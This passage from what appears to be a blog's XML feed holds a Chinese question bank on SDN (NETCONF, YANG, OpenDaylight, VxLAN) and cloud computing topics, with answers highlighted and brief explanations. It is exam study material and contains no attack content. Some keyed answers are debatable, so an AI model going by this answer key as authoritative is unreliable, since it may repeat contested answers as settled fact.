">A、NETCONF是一种基于JSON的网络配置管理协议</font></strong></p><p><strong>B、NETCONF协议分为传输层、RPC层、操作层和内容层</strong></p><p><strong>C、在NETCONF协议中，内容层是唯一没有标准化的层</strong></p><p><strong>D、NETCONF的配置功能非常强大，同时兼顾监控和故障管理，安全验证和访问控制，因此得到业界的一致认可</strong></p><p><strong><code>解析：NETCONF是一种基于XML的网络配置管理协议</code></strong></p><p><strong>345.关于YANG，描述正确的是（ ）</strong></p><p><strong>A、YANG是一种建模语言，它的目标是对NETCONF数据模型、操作进行建模</strong></p><p><strong>B、MD-SAL中的M就是通过YANG实现的</strong></p><p><strong>C、YANG MODEL是一种描述XML结构的模型</strong></p><p><strong><font style="background: yellow ">D、以上都是</font></strong></p><p><strong>346.以下不属于YANG的关键特性的是（ ）</strong></p><p><strong>A、网元配置建模</strong></p><p><strong>B、服务配置建模</strong></p><p><strong><font style="background: yellow ">C、网络接口建模</font></strong></p><p><strong>D、网络拓扑建模</strong></p><p><strong><code>解析：YANG是随着NETCONF协议而产生的数据建模语言，由RFC6020定义，类似于XML Schema和SNMP的SMI，具有良好的可读性和可扩展性。其关键特性：</code></strong><br><strong><code>● 服务和网元数据模型vs信息模型（UML）</code></strong><br><strong><code>● 领域专用语言</code></strong><br><strong><code>● 网元配置建模</code></strong><br><strong><code>● 服务配置建模</code></strong><br><strong><code>● 网络拓扑建模</code></strong><br><strong><code>● 设备厂商必须通过IETF创建和发布自己设备的YANG模型</code></strong></p><p><strong>347.下列对VxLAN的描述错误的是（ ）</strong></p><p><strong>A、VxLAN全称Virtual Extensible LAN，是一种覆盖网络技术或隧道技术</strong></p><p><strong><font style="background: yellow ">B、VxLAN技术将包含二层数据的数据包封装到IP TCP报文中</font></strong></p><p><strong>C、VxLAN技术是网络Overlay技术的一种实现</strong></p><p><strong>D、VTEP为VxLAN隧道的端点，用于VxLAN报文的封装和解封装</strong></p><p><strong><code>解析：VxLAN技术将包含二层数据的数据包封装到IP UDP报文中。</code></strong></p><p><strong>348.以下哪项不是OpenDayLight Datastore的功能（ ）</strong></p><p><strong>A、基于事务的访问与操作</strong></p><p><strong>B、支持数据变更通知</strong></p><p><strong>C、支持事物链</strong></p><p><strong><font style="background: yellow ">D、地址解析</font></strong></p><p>**<strong>349.Yang数据建模的节点类型包括（）</strong></p><p><strong>A、Leaf</strong></p><p><strong>B、Leaf list</strong></p><p><strong>C、Choice</strong></p><p><strong><font style="background: yellow ">D、以上都是</font></strong></p><p><strong>350.下面关于OpenDaylight L2Switch项目理解错误的是（）</strong></p><p><strong>A、L2Switch项目是一种基于MD-SAL的OpenDaylight控制器应用，提供基础的L2Switch功能和一些典型的L2Switch功能的服务。</strong></p><p><strong><font style="background: yellow ">B、L2Switch项目负责MAC地址学习，直接转发数据等。</font></strong></p><p><strong>C、L2Switch项目由一系列支持L2Switch功能的服务模块组成，包括地址跟踪、ARP处理器、主机跟踪、消除环路、包处理以及流表下发等。</strong></p><p><strong>D、L2Switch项目将传统L2Switch设备的控制层抽离到控制器上，使控制器具备L2Switch的处理能力。</strong></p><p><strong><code>解析：L2Switch项目不直接转发数据，通过向虚拟交换机下发流表，从而控制数据包的转发行为</code></strong></p><p><strong>351.OpenDaylight MD-SAL当前提供的基础服务有（ ）</strong></p><p><strong>A、Data Store</strong></p><p><strong>B、RPC &#x2F; Service routing</strong></p><p><strong>C、Notification subscription and publish services</strong></p><p><strong><font style="background: yellow ">D、以上都是</font></strong></p><p><strong>352.下列（ ）是OSGi的架构的核心层次。</strong></p><p><strong>A、安全层</strong></p><p><strong><font style="background: yellow ">B、模块层</font></strong></p><p><strong>C、生命周期层</strong></p><p><strong>D、服务层</strong></p><p><strong><code>解析：模块层主要涉及包和共享的代码，是OSGi的核心层次，定义了Bundle的模型，Bundle如何Import和Export代码，以及如何定义和解析Bundle之间的依赖关系</code>。</strong></p><p><strong>353.OpenDaylight架构的特点包括（ ）</strong></p><p><strong>A、基于OSGi的模块化设计</strong></p><p><strong>B、南向支持多种协议</strong></p><p><strong>C、全分布式的消息及存储机制</strong></p><p><strong><font style="background: yellow ">D、以上都是</font></strong></p><p><strong>354.判断题</strong></p><p><strong>OpenDaylight是一个模块化、可扩展、可升级、支持多协议的SDN控制器。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>355.OpenDaylight的启动参数clean可以把之前启动的缓存清除。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>356.OpenDaylight默认启动的监听端口号是6634。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：OpenDaylight默认启动的监听端口号是6633</code></strong></p><p><strong>357.在SDN网络中，其二层数据转发的机制与普通二层以太网交换机泛洪+MAC地址学习机制是一致的。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：在SDN网络中，其二层数据转发的机制与普通二层以太网交换机泛洪+MAC地址学习机制存在很大的差异。当源IP要与目的IP通信时，SDN网络会将ARP请求转发到控制器，由控制器帮助询问目的主机的MAC并将结果返回给源主机。</code></strong></p><p><strong>358.在Mininet命令行中，主机h1上启用web服务的命令是：h1 python -m SimpleHTTPServer 80 &amp;</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>359.VxLAN(Virtual Extensible Local Area Network)是一种将二层报文用三层协议进行封装的技术，可以对二层网络在三层范围进行扩展。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>360.OVS配置为主动连接方式，即OpenDaylight和OVS的连接由OVS主动发起的命令为：ovs-vsctl set-manager ptcp: 30.0.1.3:6640</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：ovs-vsctl set-manager tcp: 30.0.1.3:6640</code></strong></p><p><strong>361.OpenDaylight中的所有数据都保存在DataStore中，并且数据以树形结构存储。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>362.NETCONF规定其传输层必须使用带有安全加密的通信协议，例如SSH，TLS等。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>363.NETCONF中定义了三种消息类型，分别是init，rpc和rpc-reply，notification。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：NETCONF中定义了三种消息类型，分别是hello，rpc和rpc-reply，notification。</code></strong></p><p><strong>364.YANG是数据建模语言，用来配置模型以及通过网络配置协议(NETCONF)、NETCONF远程调用和NETCONF通知来声明数据。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>365.Karaf是一个基于OSGi的运行环境的开源项目，Karaf提供了一个轻量级的OSGi容器。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>366.件项目的一般开发流程是准备、部署、编译、打包、测试。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：软件项目的一般开发流程是准备、编译、测试、打包和部署。</code></strong></p><p><strong>367.Maven是一个采用纯Java编写的开源项目管理工具。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>368.OpenDaylight中通知(notification)是一种发布&#x2F;订阅模式。发布者发布通知，接收者接收通知，从而实现消息的交互功能。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><br /><br /><h4 id="云网络"><a href="#云网络" class="headerlink" title="云网络"></a><font face="黑体" size=6><strong>云网络</strong></font></h4><p>1.关于计算机网络的描述，错误的是（）</p><p>A、计算机网络建立的主要目的是实现计算机资源的共享，计算机资源主要是指计算机硬件、软件与数据</p><p>B、互连的计算机是分布在不同的地理位置的多台独立的“自治计算机”，连网的计算机既可以为本地用户提供服务，也可以为远程用户提供网络服务</p><p><font style="background: yellow ">C、计算机网络大大提升了单台计算机的功能和使用场景，且不会给单台计算机带来什么使用风险</font></p><p>D、连网计算机之间遵循共同的网络协议</p><p>2.路由器是一种用于网络互连的设备，但作为路由器，并不具备的功能是（）</p><p>A、支持多种路由协议</p><p><font style="background: yellow ">B、多层交换功能</font></p><p>C、支持多种可路由协议</p><p>D、具有存储、转发、寻址功能</p><p>3.以下不属于公有云的是（）</p><p>A、亚马逊云AWS</p><p>B、微软Windows Azure</p><p>C、阿里云</p><p><font style="background: yellow ">D、政务云</font></p><p>4.在Windows上装个VMware，然后在VMware上装一个Linux虚拟机，这个操作属于（）</p><p>A、存储虚拟化</p><p>B、内存虚拟化</p><p><font style="background: yellow ">C、系统虚拟化</font></p><p>D、网络虚拟化</p><p>5.关于云计算说法错误的是（）</p><p>A、云计算是基于互联网的相关服务的增加、使用和交付模式</p><p>B、云计算不针对特定的应用，在“云”的支撑下可以构造出千变万化的应用</p><p>C、云计算支持用户在任意位置，使用各种终端获取应用服务</p><p><font style="background: yellow ">D、云计算通常涉及通过互联网来提供静态难扩展且是实体化的资源</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：虚拟化服务</span><br></pre></td></tr></table></figure><p>6.下列说法错误的是（）</p><p>A、在新的生态体系中，架构最底层的交换设备只需要提供最基本、最简单的功能</p><p>B、SDN适合于云计算供应商以及面对大幅扩展工作负载的企业</p><p>C、SDN转发与控制分离的架构，可使得网络设备通用化、简单化</p><p><font style="background: yellow ">D、SDN技术不能实现灵活的集中控制和云化的应用感知</font></p><p>7.SDN架构中的核心组件是（）</p><p><font style="background: yellow ">A、控制器</font></p><p>B、服务器</p><p>C、存储器</p><p>D、运算器</p><p>8.在SDN网络中，网络设备只单纯的负责（）</p><p>A、流量控制</p><p>B、数据处理</p><p><font style="background: yellow ">C、数据转发</font></p><p>D、维护网络拓扑</p><p>9.下列关于云安全的说法正确的是（）</p><p>A、云厂商通常会在云数据中心部署专业的安全设备，因此云用户不用担心使用安全的问题</p><p><font style="background: yellow ">B、云安全也存在道高一尺魔高一丈的现象，因此解决云安全问题不是一朝一夕的事情</font></p><p>C、云安全和和传统网络安全没有任何区别</p><p>D、以上说法都对</p><p>10.关于OpenStack下列说法正确的是（）</p><p>A、OpenStack是一个由NASA（美国国家航空航天局）和Rackspace合作研发并发起的开源项目</p><p>B、OpenStack是一个云计算管理平台项目，它可以提供基础设施即服务（IaaS）的解决方案</p><p>C、OpenStack的核心组件包括Nova、Swift、Glance、Keystone、Neutron等</p><p><font style="background: yellow ">D、以上说法都对</font></p><p>11.二层以太网交换机工作在数据链路层。</p><p> <font style="background: yellow ">对</font> 错</p><p>12.UDP提供面向连接的、可靠的数据流传输，而TCP提供的是非面向连接的、不可靠的数据流传输。</p><p> 对  <font style="background: yellow ">错</font></p><p>13.网关的作用是通过它可以动态获得主机地址。</p><p> 对  <font style="background: yellow ">错</font></p><p>14.路由器的一个作用是连通不同的网络，另一个作用是选择信息传送的线路。</p><p> <font style="background: yellow ">对</font> 错</p><p>15.交换是指转发和过滤帧，是交换机的工作，它在OSI参考模型的第二层，而路由是指网络线路当中非直连的链路，它是路由器的工作，在OSI参考模型的第三层。</p><p> <font style="background: yellow ">对</font> 错</p><p>16.交换需要IP地址，而路由是不需要IP地址的。</p><p> 对  <font style="background: yellow ">错</font></p><p>17.判断题</p><p>网络层协议负责的是提供主机间的逻辑通信，运输层协议负责的是提供进程间的逻辑通信。</p><p> <font style="background: yellow ">对</font> 错</p><p>18.VLAN是网络中的重要技术，其作用之一是可以隔离广播域。</p><p> <font style="background: yellow ">对</font> 错</p><p>19.虚拟化技术包括计算、存储和网络的虚拟化，是云计算的基础。</p><p> <font style="background: yellow ">对</font> 错</p><p>20.SDN的意义在于对转发设备的灵活集中控制。</p><p> <font style="background: yellow ">对</font> 错</p><p>21.不管是云计算的网络，还是传统互联网的网络，承载于网络的上层应用是不变的，只是网络设备形态、架构、网络管理方式变化了。</p><p> <font style="background: yellow ">对</font> 错</p><p>22.Overlay和underlay网络只是在概念上有所区别，实际采用的网络技术是一样的。</p><p> 对 <font style="background: yellow ">错</font></p><p>23.OpenStack是一个开源的云计算管理平台。</p><p> <font style="background: yellow ">对</font> 错</p><p>24.亚马孙AWS是目前世界上最大的云服务提供商。</p><p> <font style="background: yellow ">对</font> 错</p><p>25.公有云面向的服务对象往往更广泛，因此规模比私有云要大。</p><p> 对 <font style="background: yellow ">错</font></p><p>26.“云”使用了数据多副本容错，比本地计算机可靠。</p><p> <font style="background: yellow ">对</font> 错</p><p>27.按提供服务的对象不同，阿里云属于以下哪种类型的云计算（ ）</p><p>A、私有云</p><p>B、企业云</p><p>C、混合云</p><p> <font style="background: yellow ">D、公有云</font></p><p>28.下列关于云计算的说法错误的是（ ）</p><p>A、云计算是基于互联网的相关服务的增加、使用和交付模式</p><p>B、云计算不针对特定的应用，在“云”的支撑下可以构造出千变万化的应用</p><p>C、云计算支持用户在任意位置，使用各种终端获取应用服务</p><p> <font style="background: yellow ">D、云计算通常指大规模的计算资源管理系统，天河一号超算就是云计算的典型应用</font></p><p>29.IaaS计算实现机制中，系统管理模块的核心功能是（ ）</p><p> <font style="background: yellow ">A、负载均衡</font></p><p>B、监视节点的运行状态</p><p>C、应用API</p><p>D、节点环境配置</p><p>30.在云计算中，虚拟层主要包括（ ）</p><p>A、服务器虚拟化</p><p>B、存储虚拟化</p><p>C、网络虚拟化</p><p> <font style="background: yellow ">D、以上都是</font></p><p>31.云计算主要解决的传统网络下的痛点包括（ ）</p><p>A、平均资源利用率及能耗效率低下</p><p>B、新业务上线测试周期长</p><p>C、企业希望从其主机托管运营商那里灵活的按需获取计算、存储和网络资源</p><p> <font style="background: yellow ">D、以上都是</font></p><p>32.亚马逊AWS提供的云计算服务类型是（ ）</p><p>A、IaaS</p><p>B、PaaS</p><p>C、SaaS</p><p> <font style="background: yellow ">D、以上都是</font></p><p>33.从研究现状上看，下面不属于云计算特点的是（ ）</p><p>A、超大规模</p><p>B、虚拟化</p><p> <font style="background: yellow ">C、私有化</font></p><p>D、高可靠性</p><p>34.互联网数据中心的简称是 （ ）</p><p> <font style="background: yellow ">A、IDC</font></p><p>B、IBC</p><p>C、DDE</p><p>D、DCM</p><p>35.下列不是云存储技术的是（ ）</p><p> <font style="background: yellow ">A、SSD</font></p><p>B、iSCSI</p><p>C、NAS</p><p>D、RAID</p><p>36.以下不属于云存储的主要技术路线的是（ ）</p><p>A、对象存储</p><p>B、存储虚拟化</p><p> <font style="background: yellow ">C、高性能磁带存储</font></p><p>D、软件定义分布式存储</p><p>37.云计算是对（ ）技术的发展与运用。</p><p>A、并行计算</p><p>B、网格计算</p><p>C、分布式计算</p><p> <font style="background: yellow ">D、以上都是</font></p><p>38.将基础设施作为服务的云计算服务类型是（ ）</p><p><font style="background: yellow ">A、IaaS</font></p><p>B、PaaS</p><p>C、SaaS</p><p>D、以上都不是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：IaaS：基础设施即服务。PaaS：平台即服务。SaaS：应用即服务。</span><br></pre></td></tr></table></figure><p>39.云计算体系结构的（ ）负责资源管理、任务管理、用户管理和安全管理等工作。</p><p>A、物理资源层</p><p>B、资源池层</p><p><font style="background: yellow ">C、管理中间件层</font></p><p>D、SOA构建层</p><p><code>解析：云计算物理资源层是最底层，包含基础硬件设施，资源池层负责对物力资源的整合监控，管理中间件负责具体的资源调度、任务管理和用户管理等工作。SOA是一种面向服务的架构，它不属于云计算的一个层，因此没有SOA构建层这种说法。</code></p><p>40.以下哪项是对虚拟机的最佳描述？（ ）</p><p>A、执行虚拟化软件测试程序的物理机</p><p><font style="background: yellow ">B、通过软件实施的计算机，可以像物理机一样执行程序</font></p><p>C、一种旨在提供网络故障切换和故障恢复功能的计算机工具</p><p>D、一种软件计算机，其中封装了物理硬件</p><p>41.如果一个虚拟机因为错误而崩溃，同一主机上的其他虚拟机不会受到影响”体现了虚拟机的什么特性？（ ）</p><p><font style="background: yellow ">A、隔离性</font></p><p>B、兼容性</p><p>C、独立于硬件</p><p>D、统一性</p><p>42.服务器虚拟化的主要作用是（ ）</p><p>A、可以节省资金，节省服务器的采购成本和运营成本</p><p>B、可以减轻管理人员负担，维护的设备数量变少了</p><p>C、可以提高效率，原来的多台服务器和大量网络&#x2F;存储资源利用率低，成本高，整合成虚拟服务器后大大提高了设备资源的利用率</p><p><font style="background: yellow ">D、以上都是</font></p><p>43.虚拟化资源指一些可以实现一定操作具有一定功能但其本身是（ ）的资源如计算池、存储池和网络池、数据库资源等，通过软件技术可实现相关的虚拟化功能包括虚拟环境、虚拟系统、虚拟平台。</p><p><font style="background: yellow ">A、虚拟</font></p><p>B、真实</p><p>C、物理</p><p>D、实体</p><p>44.下列哪个特性不是虚拟化的主要特征（ ）</p><p>A、高扩展性</p><p>B、高可用性</p><p>C、高安全性</p><p><font style="background: yellow ">D、实现技术简单</font></p><p>45.关于虚拟化技术实现方式，下列说法错误的是（ ）</p><p>A、完全虚拟化技术又叫硬件辅助虚拟化技术，它能让任何一款操作系统不用改动就能安装到虚拟服务器上</p><p>B、半虚拟化也叫准虚拟化，它需要把客户操作系统进行相应的修改</p><p><font style="background: yellow ">C、Hypervisor是工作于虚拟机（VM）和硬件之间的一个软件层，完全虚拟化技术中不需要Hypervisor</font></p><p>D、Intel VT是一种硬件虚拟化技术</p><p>46.关于KVM，下列说法错误的是（ ）</p><p>A、KVM（Kernel-based Virtual Machine）是基于内核的虚拟机，KVM是集成到Linux内核的VMM</p><p>B、KVM是x86架构且硬件支持虚拟化技术（如 intel VT 或 AMD-V）的Linux全虚拟化解决方案</p><p><font style="background: yellow ">C、KVM集成于Linux内核中，可以直接提供虚拟机上层控制界面</font></p><p>D、KVM能在不改变Linux或Windows镜像的情况下同时运行多个虚拟机</p><p><code>解析：考查对KVM虚拟化技术的理解，KVM集成于Linux系统的内核中，需要通过Libvirt对外提供虚拟机操作接口。</code></p><p>47.关于云计算的弹性机制，下列说法正确的是（ ）</p><p>A、云计算的本质是实现从资源到架构的全面弹性</p><p>B、资源层面的弹性包括计算、网络、存储资源的弹性，是指用户可以随时随地根据自身需求获取相应的计算、网络、存储资源</p><p>C、架构方面的弹性是指云平台本身的架构易于扩展和维护</p><p><font style="background: yellow ">D、以上都是</font></p><p>48.关于虚拟网络，下列说法错误的是（ ）</p><p>A、虚拟网络也是网络</p><p><font style="background: yellow ">B、虚拟网络是虚拟机之间的网络，虚拟网络和物理网络没有关系</font></p><p>C、和物理网络一样，虚拟网络包括网络拓扑，如网络节点、链接、网络节点中的查询表等要素</p><p>D、虚拟交换机是软件实现的交换机，其使用和部署起来比物理交换机更加灵活方便</p><p>49.网络虚拟化不包括以下哪一项（ ）</p><p>A、网络设备虚拟化</p><p>B、网络功能虚拟化</p><p><font style="background: yellow ">C、终端虚拟化</font></p><p>D、链路虚拟化</p><p>50.关于Open vSwitch，下列说法正确的是（ ）</p><p>A、Open vSwitch主要包括ovs-vswitchd、ovsdb-server、ovs-dpctl等模块</p><p>B、ovs-vsctl命令主要用来查询和更新ovs-vswitchd的配置</p><p>C、ovs-ofctl命令主要用来查询和管理流表</p><p><font style="background: yellow ">D、以上都是</font></p><p>51.关于VxLAN技术的阐述，下列说法不正确的是（ ）</p><p><font style="background: yellow ">A、VxLAN技术是将包含二层数据的数据包封装到TCP&#x2F;IP报文中</font></p><p>B、VxLAN技术可以解决网络中VLAN个数不够用的问题</p><p>C、VxLAN是一种隧道技术，隧道起止于VTEP节点</p><p>D、VxLAN是一种 Overlay 网络技术</p><p>52.一个网络中最多可以有多少个VLAN（ ）</p><p>A、512</p><p>B、1024</p><p>C、2048</p><p><font style="background: yellow ">D、4096</font></p><p>53.在VXLAN报文中，VNID的长度是（ ）</p><p>A、8bit</p><p>B、16bit</p><p><font style="background: yellow ">C、24bit</font></p><p>D、32bit</p><p>54.VxLAN的主要作用不包括（ ）</p><p><font style="background: yellow ">A、使数据报文分片更合理，增加网络传输速度</font></p><p>B、弥补VLAN数量不足</p><p>C、解决大量VLAN配置导致汇聚层交换机配置项过多，负荷过大的问题</p><p>D、突破二层网络边界的限制，便于虚拟机的迁移</p><p>55.关于OpenStack节点的作用，下列说法不正确的是（ ）</p><p>A、控制节点负责对其余节点的控制，包括虚拟机的创建、迁移、资源分配等</p><p><font style="background: yellow ">B、计算节点负责对整个系统的资源消耗情况进行计算</font></p><p>C、网络节点负责管理系统的网络资源</p><p>D、存储节点负责管理系统的存储资源</p><p>56.关于OpenStack实例（instance）的描述，不正确的是（ ）</p><p>A、一个实例就是一个虚拟机</p><p><font style="background: yellow ">B、实例的规格（CPU、内存、磁盘）是由镜像决定的</font></p><p>C、实例支持冷迁移和热迁移</p><p>D、实例运行于计算节点上</p><p>57.关于OpenStack镜像（Image）的描述，不正确的是（ ）</p><p>A、多个实例可以共用一个镜像</p><p>B、镜像文件的格式一般有QCOW2、ISO等</p><p>C、QCOW2是由镜像服务支持的虚机镜像磁盘格式之一，它支持内部快照，加密，压缩等一系列功能</p><p><font style="background: yellow ">D、元数据可以理解为镜像的启动参数，一般在上传镜像的时候会把元数据写入到镜像文件中</font></p><p>58.以下哪项不是Docker的优势 （ ）</p><p>A、Docker容器几乎可以在任意平台运行，其良好的兼容性和轻量特性可以轻松的实现负载的动态管理</p><p><font style="background: yellow ">B、Docker的安装部署非常简单，几乎支持所有的32位和64位操作系统</font></p><p>C、Docker对系统的利用率很高，容器除了运行其中的应用，不会消耗额外的系统资源，使应用性能很高,开销减少</p><p>D、Docker只需要小小的修改，就可以代替大量的更新工作，所有的改动都以增量的方式被分发和更新，实现自动化高效的管理</p><p>59.关于Docker核心概念，下列说法错误的是（ ）</p><p><font style="background: yellow ">A、Docker文件系统（FileSystem）和宿主机是共用的，它们的文件相互可见</font></p><p>B、镜像（Image）就是一堆只读层（read-only layer）的统一视角，一个镜像可以创建多个容器</p><p>C、仓库(repository)是一个存放镜像文件的场所，仓库注册服务器上往往存在多个仓库，每个仓库中又包含多个镜像，每个镜像有不同的标签(tag)</p><p>D、容器(Container)是从镜像创建出来的运行实例，容器可以被启动，停止，删除</p><p>60.以下关于服务器集群的说法，错误的是（ ）</p><p>A、集群就是将多台服务器组成一个资源池，共同对外提供某种服务</p><p><font style="background: yellow ">B、集群相比单服务器架构更加易于维护</font></p><p>C、集群中由于一些节点需要在异常发生时接管另外一些节点的业务，因此配置上需要预留一定的空闲资源</p><p>D、集群可以应对服务器故障引起的业务中断问题</p><p>61.关于Kubernetes的优势，下列说法错误的是（ ）</p><p>A、它是一个轻量级的容器编排和管理系统</p><p>B、它是一款开源虚拟化管理平台</p><p><font style="background: yellow ">C、它目前只能用于Docker容器的编排和管理</font></p><p>D、它的架构决定了它很容易支持业务的弹性伸缩和负载均衡</p><p>62.SaaS是一种基于互联网提供软件服务的应用模式。</p><p><font style="background: yellow "> 对</font> 错</p><p>63.云计算提供了最可靠、最安全的数据存储中心，用户不用再担心数据丢失、病毒入侵个人电脑的麻烦，用户也不用进行安全防护。</p><p> 对 <font style="background: yellow ">错</font></p><p>64.云计算可以把普通的服务器或PC连接起来以获得超级计算机的强大的计算能力。</p><p> 对 <font style="background: yellow ">错</font></p><p>65.云计算的本质是实现从资源到架构的全面弹性。所谓的弹性就是时间灵活性和空间灵活性，也即想什么时候要就什么时候要，想要多少就要多少。</p><p><font style="background: yellow "> 对</font> 错</p><p>66.云存储是一种网上在线存储的模式，即把数据存放在通常由第三方托管的多台虚拟服务器上，而非专属的服务器上。</p><p><font style="background: yellow "> 对</font> 错</p><p>67.云存储的存储管理可以实现自动化和智能化，所有分散的存储资源被整合到一起，客户看到的是单一存储空间。</p><p><font style="background: yellow "> 对</font> 错</p><p>68.云存储提高了存储效率，通过虚拟化技术解决了存储空间的浪费，可以自动重新分配数据，提高了存储空间的利用率，同时具备负载均衡、故障冗余功能。</p><p><font style="background: yellow "> 对</font> 错</p><p>69.云存储可以分为公共云存储、内部云存储、混合云存储这三类。</p><p><font style="background: yellow "> 对</font> 错</p><p>70.虚拟化技术是云计算架构的基石。</p><p><font style="background: yellow "> 对</font> 错</p><p>71.虚拟化技术主要用来解决高性能的物理硬件产能过剩和老的旧的硬件产能过低的重组重用，透明化底层物理硬件，从而最大化的利用物理硬件，简单来说就是将底层资源进行分区，并向上层提供特定的和多样化的执行环境。</p><p><font style="background: yellow "> 对</font> 错</p><p>72.通过虚拟化技术实现的虚拟机一般被称之为GuestOS(客户)，而作为GuestOS载体的物理主机称之为HostOS(宿主)。</p><p><font style="background: yellow "> 对</font> 错</p><p>73.网桥可以实现不同网络间数据帧的存储和转发，是一种在网络层进行协议转换的设备。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：网桥工作在数据链路层</span><br></pre></td></tr></table></figure><p>74.Linux网桥是一种虚拟设备，它可以将多个物理网口连接起来，使不同的网口之间可以互相通信。</p><p><font style="background: yellow "> 对</font> 错</p><p>75.物理网络常常称为Overlay Network，虚拟网络常常称为Underlay Network。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：物理网是Underlay，虚拟网是Overlay。</span><br></pre></td></tr></table></figure><p>76.Overlay网络也是一个网络，它可以脱离Underlay网络单独部署。</p><p> 对 <font style="background: yellow ">错</font></p><p>77.一个二层网络下最多可以有1024个VLAN。</p><p> 对 <font style="background: yellow ">错</font></p><p>78.虚拟网卡和虚拟交换机之间的链路叫做虚拟的链路，不同虚拟机之间通过虚拟链路组成的网络叫做虚拟网络。</p><p> <font style="background: yellow ">对</font> 错</p><p>79.OVS是开源的虚拟交换机，它可以实现跨主机之间的虚拟机通信。</p><p> <font style="background: yellow ">对</font> 错</p><p>80.Linux bridge本质上也是一个虚拟交换机，它可以实现和物理交换机类似的功能。</p><p> <font style="background: yellow ">对</font> 错</p><p>81.在数据中心中，南北向流量一般指数据中心之间的流量。</p><p> 对  <font style="background: yellow ">错</font></p><p><code>解析：数据中心南北向东西向流量的概念。客户端和服务器之间的流量被称为南北流量，不同服务器之间的流量与数据中心或不同数据中心之间的网络流被称为东西流量。</code></p><p>82.在数据中心中，东西向流量一般指进出数据中心的流量。</p><p> 对  <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：数据中心南北向东西向流量的概念。</span><br></pre></td></tr></table></figure><p>83.虚拟机迁移是指将虚拟机从一个节点迁移到另一个节点，或者从一个数据中心迁移到另一个数据中心，迁移前后虚拟机的IP地址和提供的服务不变。</p><p> <font style="background: yellow ">对</font> 错</p><p>84.微服务架构是一项在云中部署应用和服务的新技术，它旨在通过将功能分解到各个离散的服务中以实现对解决方案的解耦。</p><p> <font style="background: yellow ">对</font> 错</p><p>85.基于微服务架构设计的目的在于有效的拆分应用，实现敏捷开发和部署。</p><p> <font style="background: yellow ">对</font> 错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：微服务架构是一项在云中部署应用和服务的新技术。微服务的基本思想在于考虑围绕着业务领域组件来创建应用，这些应用可独立地进行开发、管理和加速。在分散的组件中使用微服务云架构和平台，使部署、管理和服务功能交付变得更加简单。</span><br></pre></td></tr></table></figure><p>86.以下Docker命令的解释错误的是（ ）</p><p>A、docker ps命令用于查看主机中的容器信息</p><p>B、docker start命令用于启动指定的容器</p><p>C、docker stop命令用于停止指定的容器</p><p> <font style="background: yellow ">D、docker del命令用于删除指定的容器</font></p><p><code>解析：考查对Docker命令的理解，删除指定容器的命令是docker rm。</code></p><p>87.云计算是由一系列可以动态升级和虚拟化的资源所组成的，这些资源被所有云计算的用户共享并且可以方便地通过网络访问，用户无须掌握云计算的技术，只需要按照个人或团体的需要租赁云计算的资源。</p><p><font style="background: yellow ">对</font> 错</p><p>88.云数据存储支持采用相应的数据切割、同步算法以并行方式上传和下载大容量数据。</p><p><font style="background: yellow ">对</font> 错</p><p>89.VxLAN技术并不能解决大L2网络里MAC表容量限制虚拟机的数量的问题。</p><p>对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：VXLAN通过24bit的VIND字段，可以大大扩充虚拟网络个数，解决2层网络中MAC表容量限制虚拟机的数量的问题。</span><br></pre></td></tr></table></figure><p>90.虚拟机迁移是指将虚拟机从一个节点迁移到另一个节点，或者从一个数据中心迁移到另一个数据中心，迁移前后虚拟机的IP地址和提供的服务不变 。</p><p><font style="background: yellow ">对</font> 错</p>]]></content>
      
      
      <categories>
          
          <category> 学习资料 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/posts/26401"/>
      <url>/posts/26401</url>
      
